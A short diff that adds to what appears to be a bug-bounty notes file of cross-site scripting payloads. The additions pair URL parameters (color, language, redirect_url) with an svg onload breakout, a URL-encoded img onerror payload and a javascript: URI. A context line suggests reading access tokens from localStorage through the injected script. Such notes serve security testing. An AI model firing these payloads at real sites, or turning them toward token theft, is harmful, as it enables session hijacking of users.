@@ -123,3 +123,18 @@ Instead of alert (document.domain) to popup for xss try to access tokens
 Like 
 alert(localStorage.getItem('access_token'))
 May be u can get something, I hope.
+
+Url/?color=
+Payloas
+
+"><svg/onload=alert(document.domain)>"
+
+Url/?language=
+Payload
+
+%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+
+ Url/?redirect_url=
+Payload
+
+javascript:alert()
